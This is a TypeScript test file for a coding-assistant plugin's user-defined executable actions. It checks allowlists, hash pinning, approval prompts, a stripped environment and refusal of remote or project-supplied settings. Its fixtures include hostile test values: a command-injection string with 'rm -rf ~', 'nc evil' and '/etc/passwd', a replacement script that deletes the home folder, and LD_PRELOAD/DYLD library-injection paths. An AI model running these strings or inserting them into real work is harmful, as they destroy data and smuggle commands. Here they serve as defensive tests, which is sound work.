import { expect, mock, test } from './kit'
import type { Engine } from 'claude-code/testing'
import type { On } from 'claude-code'

import { utf8Encode } from '../hooks/codec'
import {
  ALLOWLIST_RELATIVE,
  APPROVALS_KEY,
  ENV_BIN,
  EXEC_CONCURRENT_MAX,
  EXEC_HISTORY_MAX,
  EXEC_PATH,
  EXEC_SLOT_GRACE_MS,
  EXEC_TIMEOUT_DEFAULT_MS,
  HISTORY_KEY,
} from '../hooks/exec'
import { MESSAGES } from '../hooks/i18n'
import { sha256 } from '../hooks/sha'
import { BAND, EN, EVERY_ACTION_FITS, JA, PANE, PICKER_PANE, PLUGIN, defaultProcessAnswer, execWorld, hintIcons, listedActions, runCommand, showKind, stage, start } from './stage'
import type { ExecWorld, Stage } from './stage'

// Custom actions of kind exec (SELM-00117), run through the plugin: what each
// of the three kinds hands the executable and shows, and every case in which
// nothing runs, each with its reason where the person reads it. The file
// system, the settings, the environment, the approval dialog and the process
// are all mocked (tests/stage.tsx execWorld): nothing here starts a command.

const HOME = '/Users/me'
const ALLOW = `${HOME}/${ALLOWLIST_RELATIVE}`
const TOOL = `${HOME}/bin/upper.sh`
const SCRIPT = '#!/bin/sh\ntr a-z A-Z\n'
const OTHER = '#!/bin/sh\nrm -rf ~\n'
const hashOf = (text: string) => sha256(utf8Encode(text))

const UPPER = { id: 'upper', icon: '🔠', label: 'Upper', kind: 'exec', command: TOOL, args: ['--fixed', '$(not-expanded)'] }
const TALK = { id: 'talk', icon: '🗣', label: 'Talk', kind: 'exec', command: TOOL, target: 'context', timeoutMs: 5000 }
const FREE = { id: 'free', icon: '🧾', label: 'Free', kind: 'exec', command: TOOL, target: 'none' }
const DEFS = [UPPER, TALK, FREE]
const SETTING = JSON.stringify(DEFS)
const OPTIONS = { ...EN, customActions: SETTING }

const NASTY = "x; rm -rf ~ $(touch /tmp/pwned) `id` | nc evil 1 && y\n'q' \"q\" ${HOME} > /etc/passwd"

const t = MESSAGES.en

/** The user settings that hold `setting` as this plugin's customActions, under one entry. */
const userSettings = (setting: string) => ({ pluginConfigs: { [`${PLUGIN}@market`]: { options: { customActions: setting } } } })

/**
 * The world where the exec actions may run: the person's own settings, the
 * allowlist naming TOOL (with `sha` when given), TOOL being SCRIPT, the
 * approval dialog approving. Each test changes what it is about.
 */
function setUp(on: On, opts: { setting?: string; sha?: string; answer?: string | null } = {}) {
  const s = stage(on)
  const w = execWorld(on, {
    env: { HOME, LANG: 'en_US.UTF-8', TMPDIR: '/tmp/me/', SECRET_TOKEN: 'hunter2' },
    files: {
      [HOME]: { kind: 'dir' },
      '/repo': { kind: 'dir' },
      [ALLOW]: { content: JSON.stringify({ executables: [{ path: TOOL, ...(opts.sha === undefined ? {} : { sha256: opts.sha }) }] }) },
      [TOOL]: { content: SCRIPT },
    },
    messages: [
      { role: 'user', text: 'why `id`?' },
      { role: 'assistant', text: 'because $(x)' },
    ],
    answer: opts.answer === undefined ? t.execApprove : opts.answer,
  })
  s.sourceSettings.user = userSettings(opts.setting ?? SETTING)
  s.processAnswer = argv => (argv[0] === ENV_BIN ? { exitCode: 0, stdout: 'HELLO WORLD\n' } : defaultProcessAnswer(argv))
  return { s, w }
}

/** The exec runs asked of $.process.run (uname aside). */
const execRuns = (s: Stage) => s.processRuns.filter(r => r.argv[0] === ENV_BIN)

/** Every text the result pane draws now. */
async function paneTexts($: Engine): Promise<string[]> {
  const pane = await $.ui.mount({ ...PANE, surface: 'terminal' })
  const texts = (await pane.findAll({ type: 'Text' })).map(f => f.text)
  await pane.unmount()
  return texts
}

const expectedArgv = (target: string, args: readonly string[] = []) => [
  ENV_BIN,
  '-i',
  `PATH=${EXEC_PATH}`,
  `HOME=${HOME}`,
  'LANG=en_US.UTF-8',
  'TMPDIR=/tmp/me/',
  `QUICK_ACTIONS_TARGET=${target}`,
  'QUICK_ACTIONS_LANG=en',
  TOOL,
  ...args,
]

// ---------------------------------------------------------------------------
// The three kinds run

test('[ ] selection: approved once at the terminal, the selection on stdin alone, the output in the pane', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s, w } = setUp(on)
  await start($)
  s.selected = NASTY
  await clock.advance(400)
  const band = await $.ui.mount({ ...BAND, surface: 'terminal', viewport: EVERY_ACTION_FITS })
  expect(await hintIcons(band)).toContain('[🔠]')
  await band.press({ key: 'upper' })
  await clock.settle()

  // Asked once, showing what runs.
  expect(w.asked).toHaveLength(1)
  expect(w.asked[0]?.options).toEqual([t.execApprove, t.execCancel])
  expect(w.asked[0]?.header).toBe(t.execApproveHeader)
  expect(w.asked[0]?.question).toContain(TOOL)
  expect(w.asked[0]?.question).toContain(hashOf(SCRIPT))
  expect(w.asked[0]?.question).toContain('["--fixed","$(not-expanded)"]')

  // Run with no shell: env -i, the variables allowed, the path, the fixed arguments as written.
  const runs = execRuns(s)
  expect(runs).toEqual([{ argv: expectedArgv('selection', ['--fixed', '$(not-expanded)']), cwd: HOME, stdin: NASTY, timeoutMs: EXEC_TIMEOUT_DEFAULT_MS }])
  // Nothing of the selection in the argument vector, nor any other variable of the host.
  for (const a of runs[0]!.argv) {
    expect(a).not.toContain('rm -rf')
    expect(a).not.toContain('pwned')
    expect(a).not.toContain('hunter2')
  }
  expect(s.stored[APPROVALS_KEY]).toEqual({ upper: { path: TOOL, args: ['--fixed', '$(not-expanded)'], sha256: hashOf(SCRIPT) } })
  expect(await paneTexts($)).toContain('HELLO WORLD')

  // Approved: the next run asks nothing.
  s.selected = null
  await clock.advance(400)
  s.selected = 'again'
  await clock.advance(400)
  await band.press({ key: 'upper' })
  await clock.settle()
  expect(w.asked).toHaveLength(1)
  expect(execRuns(s).map(r => r.stdin)).toEqual([NASTY, 'again'])
})

test('< > context: the conversation as JSON of role and text on stdin, by the command typed at the prompt', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s, w } = setUp(on)
  await start($)
  const r = await runCommand($, 'talk')
  await clock.settle()
  expect(JSON.stringify(r)).toContain(t.showing('Quick Actions', 'Talk'))
  expect(w.asked).toHaveLength(1)
  const runs = execRuns(s)
  expect(runs).toHaveLength(1)
  expect(runs[0]?.argv).toEqual(expectedArgv('context'))
  expect(runs[0]?.timeoutMs).toBe(5000)
  expect(JSON.parse(runs[0]!.stdin!)).toEqual([
    { role: 'user', text: 'why `id`?' },
    { role: 'assistant', text: 'because $(x)' },
  ])
  expect(await paneTexts($)).toContain('HELLO WORLD')
})

test('{ } standalone: its argument on stdin, never in the argument vector', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s } = setUp(on)
  await start($)
  await runCommand($, `free ${NASTY.split('\n')[0]}`)
  await clock.settle()
  const runs = execRuns(s)
  expect(runs).toHaveLength(1)
  expect(runs[0]?.argv).toEqual(expectedArgv('none'))
  expect(runs[0]?.stdin).toBe(NASTY.split('\n')[0])

  // With no argument: empty stdin.
  await runCommand($, 'free')
  await clock.settle()
  expect(execRuns(s)[1]?.stdin).toBe('')
})

test('{ } standalone from the hint line: the argument screen, then the run with what was typed', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s } = setUp(on)
  await start($)
  await runCommand($, 'hint')
  const band = await $.ui.mount({ ...BAND, surface: 'terminal', viewport: EVERY_ACTION_FITS })
  await showKind(band, 'standalone')
  await band.press({ key: 'free' })
  const picker = await $.ui.mount({ ...PICKER_PANE, surface: 'terminal' })
  await picker.input({ key: '_arg', text: 'abc | def' })
  await clock.settle()
  expect(execRuns(s).map(r => r.stdin)).toEqual(['abc | def'])
})

// ---------------------------------------------------------------------------
// How a run ends

test('an exit code other than 0 is a failure: the code and the standard error shown, escaped', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s } = setUp(on)
  s.processAnswer = argv => (argv[0] === ENV_BIN ? { exitCode: 3, stdout: '', stderr: 'boom \u001b[31m' } : defaultProcessAnswer(argv))
  await start($)
  await runCommand($, 'free')
  await clock.settle()
  const texts = (await paneTexts($)).join('\n')
  expect(texts).toContain(t.failed(t.execExit(3)))
  expect(texts).toContain(t.execStderr)
  expect(texts).toContain('boom \\u001b[31m')
  expect(texts).not.toContain('\u001b')
})

test('an exit code other than 0 with its output cut by $.process.run: said so under each heading', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s } = setUp(on)
  s.processAnswer = argv =>
    argv[0] === ENV_BIN
      ? { exitCode: 1, stdout: 'partial out', stderr: 'partial err', isStdoutTruncated: true, isStderrTruncated: true }
      : defaultProcessAnswer(argv)
  await start($)
  await runCommand($, 'free')
  await clock.settle()
  const texts = (await paneTexts($)).join('\n')
  expect(texts).toContain(`${t.execStderr}\npartial err\n${t.execTruncated}`)
  expect(texts).toContain(`${t.execStdout}\npartial out\n${t.execTruncated}`)
})

test('the timeout is a failure that says so', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s } = setUp(on)
  s.processAnswer = argv => (argv[0] === ENV_BIN ? { deny: 'Command timed out' } : defaultProcessAnswer(argv))
  await start($)
  await runCommand($, 'free')
  await clock.settle()
  expect((await paneTexts($)).join('\n')).toContain(t.failed(t.execTimeout(30)))
})

test('a start that fails is a failure that says why', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s } = setUp(on)
  s.processAnswer = argv => (argv[0] === ENV_BIN ? { deny: 'spawn EACCES' } : defaultProcessAnswer(argv))
  await start($)
  await runCommand($, 'free')
  await clock.settle()
  const texts = (await paneTexts($)).join('\n')
  expect(texts).toContain(t.failed(t.execNotStarted('').slice(0, -2)))
  expect(texts).toContain('spawn EACCES')
})

test('the output: hidden characters escaped as a model answer is, nothing written said so', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s } = setUp(on)
  let out = 'red \u001b[31mX\u001b[0m zero\u200Bwidth'
  s.processAnswer = argv => (argv[0] === ENV_BIN ? { exitCode: 0, stdout: out } : defaultProcessAnswer(argv))
  await start($)
  await runCommand($, 'free')
  await clock.settle()
  const texts = (await paneTexts($)).join('\n')
  expect(texts).toContain('red \\u001b[31mX\\u001b[0m zero\\u200bwidth')
  expect(texts).not.toMatch(/[\u001b\u200B]/)
  out = ''
  await runCommand($, 'free')
  await clock.settle()
  expect(await paneTexts($)).toContain(t.execNoOutput)
})

// ---------------------------------------------------------------------------
// Nothing runs: the approval

const refusedIn = async ($: Engine, s: Stage, reason: string) => {
  expect(execRuns(s)).toEqual([])
  expect((await paneTexts($)).join('\n')).toContain(reason)
  expect(s.toasts.some(x => x.includes(reason))).toBe(true)
}

for (const [name, answer] of [
  ['Cancel', t.execCancel],
  ['the dialog dismissed', null],
  ['a text typed under Other', `${t.execApprove} `],
] as const) {
  test(`not approved (${name}): nothing runs, and why is shown`, { options: OPTIONS }, async ($, on) => {
    const clock = mock.clock(on)
    const { s, w } = setUp(on, { answer })
    await start($)
    await runCommand($, 'free')
    await clock.settle()
    expect(w.asked).toHaveLength(1)
    expect(s.stored[APPROVALS_KEY]).toBeUndefined()
    await refusedIn($, s, t.customReason({ code: 'execDeclined' }))
  })
}

test('not approved and asked from afar (the bridge, a remote surface): never asked, nothing runs; approved, it runs from there', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s, w } = setUp(on)
  await start($)
  await $.command.run({ command: PLUGIN, args: 'free', origin: { kind: 'bridge' }, presentation: { isFullscreen: true, columns: 120 } })
  await clock.settle()
  expect(w.asked).toEqual([])
  await refusedIn($, s, t.customReason({ code: 'execRemote' }))

  // A press on the mobile app's hint line: the same.
  await runCommand($, 'hint')
  const band = await $.ui.mount({ ...BAND, surface: 'mobile', viewport: EVERY_ACTION_FITS })
  await showKind(band, 'context')
  await band.press({ key: 'talk' })
  await clock.settle()
  expect(w.asked).toEqual([])
  expect(execRuns(s)).toEqual([])

  // Approved at the terminal once: then it runs from afar too.
  await runCommand($, 'free')
  await clock.settle()
  expect(w.asked).toHaveLength(1)
  await $.command.run({ command: PLUGIN, args: 'free', origin: { kind: 'bridge' }, presentation: { isFullscreen: true, columns: 120 } })
  await clock.settle()
  expect(w.asked).toHaveLength(1)
  expect(execRuns(s)).toHaveLength(2)
})

test('approved, then its arguments changed: asked again (and refused from afar)', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s, w } = setUp(on)
  // An approval kept for other arguments.
  s.stored[APPROVALS_KEY] = { upper: { path: TOOL, args: ['--fixed'], sha256: hashOf(SCRIPT) } }
  await start($)
  s.selected = 'abc'
  await $.command.run({ command: PLUGIN, args: 'upper', origin: { kind: 'bridge' }, presentation: { isFullscreen: true, columns: 120 } })
  await clock.settle()
  await refusedIn($, s, t.customReason({ code: 'execRemote' }))
  await runCommand($, 'upper')
  await clock.settle()
  expect(w.asked).toHaveLength(1)
  expect(execRuns(s)).toHaveLength(1)
})

test('approved, then the executable replaced: asked again, showing the new SHA-256', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s, w } = setUp(on)
  await start($)
  await runCommand($, 'free')
  await clock.settle()
  expect(w.asked).toHaveLength(1)
  w.files[TOOL] = { content: OTHER }
  w.answer = t.execCancel
  await runCommand($, 'free')
  await clock.settle()
  expect(w.asked).toHaveLength(2)
  expect(w.asked[1]?.question).toContain(hashOf(OTHER))
  expect(execRuns(s)).toHaveLength(1)
})

test('replaced while the approval was up: not run', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s, w } = setUp(on)
  w.onAsk = () => {
    w.files[TOOL] = { content: OTHER }
  }
  await start($)
  await runCommand($, 'free')
  await clock.settle()
  await refusedIn($, s, t.customReason({ code: 'execChanged' }))
})

// ---------------------------------------------------------------------------
// Nothing runs: the allowlist and the executable

test('the SHA-256 in the allowlist not matching: nothing asked, nothing run', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s, w } = setUp(on, { sha: hashOf(OTHER) })
  await start($)
  await runCommand($, 'free')
  await clock.settle()
  expect(w.asked).toEqual([])
  await refusedIn($, s, t.customReason({ code: 'execHashMismatch', path: TOOL }))
})

test('the SHA-256 in the allowlist matching (in capitals too): it runs', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s } = setUp(on, { sha: hashOf(SCRIPT).toUpperCase() })
  await start($)
  await runCommand($, 'free')
  await clock.settle()
  expect(execRuns(s)).toHaveLength(1)
})

test('the allowlisted path now a link to another file: not in the allowlist, nowhere shown, never run', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s, w } = setUp(on)
  w.files[TOOL] = { realPath: '/tmp/evil.sh' }
  w.files['/tmp/evil.sh'] = { content: OTHER }
  await start($)
  const r = await runCommand($, 'free')
  await clock.settle()
  const reason = t.customReason({ code: 'execNotAllowed', path: '/tmp/evil.sh' })
  expect(JSON.stringify(r)).toContain(JSON.stringify(t.customIgnoredId('free', reason)).slice(1, -1))
  expect(w.asked).toEqual([])
  expect(execRuns(s)).toEqual([])
})

test('a command that is a link to the allowlisted file: it runs that file, by the path it lands on', { options: { ...EN, customActions: JSON.stringify([{ ...FREE, command: '/Users/me/link' }]) } }, async ($, on) => {
  const clock = mock.clock(on)
  const { s, w } = setUp(on, { setting: JSON.stringify([{ ...FREE, command: '/Users/me/link' }]) })
  w.files['/Users/me/link'] = { realPath: TOOL }
  await start($)
  await runCommand($, 'free')
  await clock.settle()
  expect(execRuns(s).map(r => r.argv.at(-1))).toEqual([TOOL])
  expect(w.asked[0]?.question).toContain(TOOL)
})

test('a command that lands on a path with =: never handed to env, and why is shown', { options: { ...EN, customActions: JSON.stringify([{ ...FREE, command: '/Users/me/plain' }]) } }, async ($, on) => {
  const clock = mock.clock(on)
  const { s, w } = setUp(on, { setting: JSON.stringify([{ ...FREE, command: '/Users/me/plain' }]) })
  w.files['/Users/me/plain'] = { realPath: '/Users/me/a=b' }
  w.files['/Users/me/a=b'] = { content: SCRIPT }
  await start($)
  const r = await runCommand($, 'free')
  await clock.settle()
  expect(JSON.stringify(r)).toContain(JSON.stringify(t.customReason({ code: 'execPath', field: 'realPath', path: '/Users/me/a=b' })).slice(1, -1))
  expect(execRuns(s)).toEqual([])
})

for (const [name, command] of [
  ['a relative path', 'bin/upper.sh'],
  ['a name looked up in PATH', 'tr'],
  ['a path with ~', '~/bin/upper.sh'],
] as const) {
  test(`${name}: refused as written, told, never run`, { options: { ...EN, customActions: JSON.stringify([{ ...FREE, command }]) } }, async ($, on) => {
    const clock = mock.clock(on)
    const { s, w } = setUp(on, { setting: JSON.stringify([{ ...FREE, command }]) })
    await start($)
    const r = await runCommand($, 'free')
    await clock.settle()
    expect(JSON.stringify(r)).toContain(t.customIgnoredId('free', '').slice(0, 20))
    expect(JSON.stringify(r)).toContain('write command as the executable')
    expect(w.asked).toEqual([])
    expect(execRuns(s)).toEqual([])
  })
}

test('a command in no allowlist entry: left out at load, told on all three paths', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s, w } = setUp(on)
  w.files[ALLOW] = { content: JSON.stringify({ executables: [{ path: '/opt/other.sh' }, { path: 'relative' }] }) }
  await start($)
  await clock.settle()
  const reason = t.customReason({ code: 'execNotAllowed', path: TOOL })
  // The toast: every definition refused (three) and the entry left out, the first reason.
  expect(s.toasts).toHaveLength(1)
  expect(s.toasts[0]).toContain('4 problem(s)')
  expect(s.toasts[0]).toContain(`#1 (upper): ${reason}`)
  // The command: each listed.
  const r = JSON.stringify(await runCommand($, ''))
  for (const line of [`- #1 (upper): ${reason}`, `- #2 (talk): ${reason}`, `- #3 (free): ${reason}`, `- ${t.customReason({ code: 'execAllowlistEntry', entry: 2 })}`]) {
    expect(r).toContain(JSON.stringify(line).slice(1, -1))
  }
  // The pane's top.
  const texts = await paneTexts($)
  expect(texts).toContain(t.customProblemsHeading)
  expect(texts).toContain(`- #1 (upper): ${reason}`)
  expect(w.asked).toEqual([])
  expect(execRuns(s)).toEqual([])
})

test('no allowlist file: every exec definition refused, never asked, never run', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s, w } = setUp(on)
  delete w.files[ALLOW]
  await start($)
  const r = await runCommand($, 'talk')
  await clock.settle()
  expect(JSON.stringify(r)).toContain(JSON.stringify(t.customReason({ code: 'execAllowlist', why: 'missing' })).slice(1, -1))
  expect(w.asked).toEqual([])
  expect(execRuns(s)).toEqual([])
})

test('the allowlist landing in the project (a link into the repository): not read', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s, w } = setUp(on)
  w.files[ALLOW] = { realPath: '/repo/allowed.json' }
  w.files['/repo/allowed.json'] = { content: JSON.stringify({ executables: [{ path: TOOL }] }) }
  await start($)
  const r = await runCommand($, 'free')
  await clock.settle()
  expect(JSON.stringify(r)).toContain(JSON.stringify(t.customReason({ code: 'execAllowlist', why: 'inProject' })).slice(1, -1))
  expect(w.reads).not.toContain('/repo/allowed.json')
  expect(execRuns(s)).toEqual([])
})

test('on Windows: refused, said so', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s, w } = setUp(on)
  w.env['OS'] = 'Windows_NT'
  await start($)
  const r = await runCommand($, 'free')
  await clock.settle()
  expect(JSON.stringify(r)).toContain(t.customReason({ code: 'execUnsupported' }))
  expect(execRuns(s)).toEqual([])
})

// ---------------------------------------------------------------------------
// Nothing runs: where the definition came from

for (const [name, change, why] of [
  ['written in the project alone (the user settings without it)', (s: Stage) => (s.sourceSettings.user = {}), 'keys'],
  ['the project overriding the person\'s text', (s: Stage) => (s.sourceSettings.user = userSettings('[]')), 'mismatch'],
  [
    'two entries of the plugin in the user settings',
    (s: Stage) =>
      (s.sourceSettings.user = { pluginConfigs: { [`${PLUGIN}@a`]: { options: { customActions: SETTING } }, [`${PLUGIN}@inline`]: { options: { customActions: SETTING } } } }),
    'keys',
  ],
  ['HOME moved by the project settings', (s: Stage) => (s.sourceSettings.project = { env: { HOME: '/repo' } }), 'home'],
  ['HOME moved by the local settings', (s: Stage) => (s.sourceSettings.local = { env: { HOME: '/repo' } }), 'home'],
  ['the user settings not readable', (s: Stage) => (s.sourceDeny = ['user']), 'unreadable'],
] as const) {
  test(`not the person's own (${name}): never asked, never run, said why`, { options: OPTIONS }, async ($, on) => {
    const clock = mock.clock(on)
    const { s, w } = setUp(on)
    change(s)
    await start($)
    await clock.settle()
    const reason = t.customReason({ code: 'execScope', why })
    expect(s.toasts[0]).toContain(reason)
    for (const id of ['upper', 'talk', 'free']) {
      s.selected = 'abc'
      const r = await runCommand($, id)
      expect(JSON.stringify(r)).toContain(JSON.stringify(t.customIgnoredId(id, reason)).slice(1, -1))
    }
    await clock.settle()
    expect(w.asked).toEqual([])
    expect(execRuns(s)).toEqual([])
    expect(w.reads).toEqual([])
  })
}

// ---------------------------------------------------------------------------
// The gate: what is shown, checked once

test('refused exec actions are on neither the hint line nor the ⋯ dialog, even pinned; allowed ones are', { options: { ...EN, customActions: JSON.stringify([UPPER, { ...UPPER, id: 'bad', icon: '🚫', command: '/opt/nope.sh' }]), pinActions: 'bad,upper' } }, async ($, on) => {
  const clock = mock.clock(on)
  const { s, w } = setUp(on, { setting: JSON.stringify([UPPER, { ...UPPER, id: 'bad', icon: '🚫', command: '/opt/nope.sh' }]) })
  w.files['/opt/nope.sh'] = { content: SCRIPT }
  await start($)
  s.selected = 'abc'
  await clock.advance(400)
  const band = await $.ui.mount({ ...BAND, surface: 'terminal', viewport: EVERY_ACTION_FITS })
  const icons = await hintIcons(band)
  expect(icons[0]).toBe('[🔠]')
  expect(icons).not.toContain('[🚫]')
  await runCommand($, '')
  const picker = await $.ui.mount({ ...PICKER_PANE, surface: 'terminal' })
  const listed = await listedActions(picker)
  expect(listed).toContain('upper')
  expect(listed).not.toContain('bad')
  // Checked once for the load, however many drew and ran.
  expect(s.sourceReads.filter(x => x === 'user')).toHaveLength(1)
})

test('the gate checked before session.start is the same one: a command run first', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s } = setUp(on)
  await runCommand($, 'free')
  await start($)
  await clock.settle()
  await runCommand($, 'free')
  await clock.settle()
  expect(s.sourceReads.filter(x => x === 'user')).toHaveLength(1)
  expect(execRuns(s)).toHaveLength(2)
})

test('no exec definition: no settings source and no file is read', { options: { ...JA, customActions: JSON.stringify([{ id: 'mine', icon: '🪄', label: 'Mine', kind: 'complete', model: 'haiku', prompt: 'Do.' }]) } }, async ($, on) => {
  const clock = mock.clock(on)
  const { s, w } = setUp(on)
  await start($)
  s.selected = 'abc'
  await clock.advance(400)
  const band = await $.ui.mount({ ...BAND, surface: 'terminal', viewport: EVERY_ACTION_FITS })
  await band.press({ key: 'mine' })
  await runCommand($, '')
  await clock.settle()
  expect(s.sourceReads).toEqual([])
  expect(w.reads).toEqual([])
  expect(s.toasts).toEqual([])
})

test('static and gate problems together: the toast counts both', { options: { ...EN, customActions: JSON.stringify([{ ...UPPER, id: 'p', prompt: 'x' }, FREE]) } }, async ($, on) => {
  const clock = mock.clock(on)
  const { s } = setUp(on, { setting: JSON.stringify([{ ...UPPER, id: 'p', prompt: 'x' }, FREE]) })
  s.sourceSettings.project = { env: { HOME: '/repo' } }
  await start($)
  await clock.settle()
  expect(s.toasts).toHaveLength(1)
  expect(s.toasts[0]).toContain('2 problem(s)')
  expect(s.toasts[0]).toContain('#1 (p): a definition of kind exec cannot have prompt')
})

// ---------------------------------------------------------------------------
// SELM-00120: the dynamic loader's variables, where a run may be asked from
// (execOrigin), how many run at once, the history and `/quick-actions exec-approvals`

const fromAfar = (kind: 'bridge' | 'sdk' | 'peer' | 'scheduled-trigger' | 'task-notification', args: string) =>
  ({ command: PLUGIN, args, origin: { kind }, presentation: { isFullscreen: true, columns: 120 } }) as const
const fromPlugin = (args: string) => ({ command: PLUGIN, args, origin: { kind: 'plugin', name: 'other' }, presentation: { isFullscreen: true, columns: 120 } }) as const

/** The user settings that hold SETTING and `execOrigin`. */
const userWithOrigin = (execOrigin: string) => ({ pluginConfigs: { [`${PLUGIN}@market`]: { options: { customActions: SETTING, execOrigin } } } })

test('a loader variable in the project settings: exec off, on neither the hint line nor the dialog, the command says why, nothing runs', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s, w } = setUp(on)
  s.sourceSettings.project = { env: { LD_PRELOAD: '/repo/evil.so' } }
  await start($)
  s.selected = 'abc'
  await clock.advance(400)
  const reason = t.customReason({ code: 'execScope', why: 'loader', name: 'LD_PRELOAD' })
  expect(s.toasts[0]).toContain(reason)
  await runCommand($, '')
  const picker = await $.ui.mount({ ...PICKER_PANE, surface: 'terminal' })
  expect(await listedActions(picker)).not.toContain('upper')
  const r = await runCommand($, 'upper')
  expect(JSON.stringify(r)).toContain(JSON.stringify(t.customIgnoredId('upper', reason)).slice(1, -1))
  await clock.settle()
  expect(w.asked).toEqual([])
  expect(execRuns(s)).toEqual([])
})

test('a DYLD_ variable in the flag settings: exec off the same way', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s } = setUp(on)
  s.sourceSettings.flag = { env: { DYLD_INSERT_LIBRARIES: '/tmp/x.dylib' } }
  await start($)
  const r = await runCommand($, 'free')
  await clock.settle()
  expect(JSON.stringify(r)).toContain(t.customReason({ code: 'execScope', why: 'loader', name: 'DYLD_INSERT_LIBRARIES' }))
  expect(execRuns(s)).toEqual([])
})

test('execOrigin terminal in the user settings: approved, still refused from anywhere but the terminal and the prompt', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s, w } = setUp(on)
  s.sourceSettings.user = userWithOrigin('terminal')
  await start($)
  // Approved at the prompt, and run.
  await runCommand($, 'free')
  await clock.settle()
  expect(w.asked).toHaveLength(1)
  expect(execRuns(s)).toHaveLength(1)
  const reason = t.customReason({ code: 'execOrigin' })
  for (const kind of ['bridge', 'sdk', 'peer', 'scheduled-trigger', 'task-notification'] as const) {
    s.toasts = []
    await $.command.run(fromAfar(kind, 'free'))
    await clock.settle()
    expect(execRuns(s)).toHaveLength(1)
    expect(s.toasts.some(x => x.includes(reason))).toBe(true)
  }
  await $.command.run(fromPlugin('free'))
  await clock.settle()
  expect(execRuns(s)).toHaveLength(1)
  expect((await paneTexts($)).join('\n')).toContain(reason)

  // A press on the mobile app's or the desktop app's hint line: refused too.
  for (const surface of ['mobile', 'desktop'] as const) {
    await runCommand($, 'hint')
    const band = await $.ui.mount({ ...BAND, surface, viewport: EVERY_ACTION_FITS })
    await showKind(band, 'standalone')
    await band.press({ key: 'free' })
    await clock.settle()
    await band.unmount()
  }
  expect(execRuns(s)).toHaveLength(1)

  // A press at the terminal, and the prompt: run, no question asked again.
  await runCommand($, 'hint')
  const band = await $.ui.mount({ ...BAND, surface: 'terminal', viewport: EVERY_ACTION_FITS })
  await showKind(band, 'context')
  await band.press({ key: 'talk' })
  await clock.settle()
  await runCommand($, 'free')
  await clock.settle()
  expect(execRuns(s)).toHaveLength(3)
  expect(w.asked).toHaveLength(2)
})

test('execOrigin terminal in the user settings: another settings file merging anywhere does not lift it', { options: { ...OPTIONS, execOrigin: 'anywhere' } }, async ($, on) => {
  const clock = mock.clock(on)
  const { s } = setUp(on)
  s.sourceSettings.user = userWithOrigin('terminal')
  s.sourceSettings.project = { pluginConfigs: { [`${PLUGIN}@market`]: { options: { execOrigin: 'anywhere' } } } }
  s.stored[APPROVALS_KEY] = { free: { path: TOOL, args: [], sha256: hashOf(SCRIPT) } }
  await start($)
  await $.command.run(fromAfar('bridge', 'free'))
  await clock.settle()
  expect(execRuns(s)).toEqual([])
  expect((await paneTexts($)).join('\n')).toContain(t.customReason({ code: 'execOrigin' }))
})

test('execOrigin terminal merged from another settings file alone: on as well', { options: { ...OPTIONS, execOrigin: 'terminal' } }, async ($, on) => {
  const clock = mock.clock(on)
  const { s } = setUp(on)
  s.stored[APPROVALS_KEY] = { free: { path: TOOL, args: [], sha256: hashOf(SCRIPT) } }
  await start($)
  await $.command.run(fromAfar('sdk', 'free'))
  await clock.settle()
  expect(execRuns(s)).toEqual([])
  await runCommand($, 'free')
  await clock.settle()
  expect(execRuns(s)).toHaveLength(1)
})

test('execOrigin read at each run: turned on in the user settings mid-session, the next run from afar is refused', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s } = setUp(on)
  s.stored[APPROVALS_KEY] = { free: { path: TOOL, args: [], sha256: hashOf(SCRIPT) } }
  await start($)
  await $.command.run(fromAfar('bridge', 'free'))
  await clock.settle()
  expect(execRuns(s)).toHaveLength(1)
  s.sourceSettings.user = userWithOrigin('terminal')
  await $.command.run(fromAfar('bridge', 'free'))
  await clock.settle()
  expect(execRuns(s)).toHaveLength(1)
})

test('config.set: execOrigin taken off terminal by another plugin or the bridge is refused; by the person in /config, or to terminal, it goes through', { options: OPTIONS }, async ($, on) => {
  on('config.set', (_$, e) => ({ value: e.value }))
  setUp(on)
  await start($)
  const set = (key: string, value: string, origin: { kind: 'composer' } | { kind: 'bridge' } | { kind: 'plugin'; name: string }) =>
    $.config.set({ key, value, previous: 'terminal', provider: { plugin: PLUGIN, tier: 'user' }, origin })
  const denied = { deny: t.execOriginConfigDenied }
  expect(await set(`${PLUGIN}.execOrigin`, 'anywhere', { kind: 'plugin', name: 'other' })).toEqual(denied)
  expect(await set(`${PLUGIN}@market.execOrigin`, 'anywhere', { kind: 'bridge' })).toEqual(denied)
  expect(await set(`${PLUGIN}.execOrigin`, 'anywhere', { kind: 'composer' })).toEqual({ value: 'anywhere' })
  expect(await set(`${PLUGIN}.execOrigin`, 'terminal', { kind: 'plugin', name: 'other' })).toEqual({ value: 'terminal' })
  // Any other row is left alone.
  expect(await set(`${PLUGIN}.language`, 'ja', { kind: 'plugin', name: 'other' })).toEqual({ value: 'ja' })
})

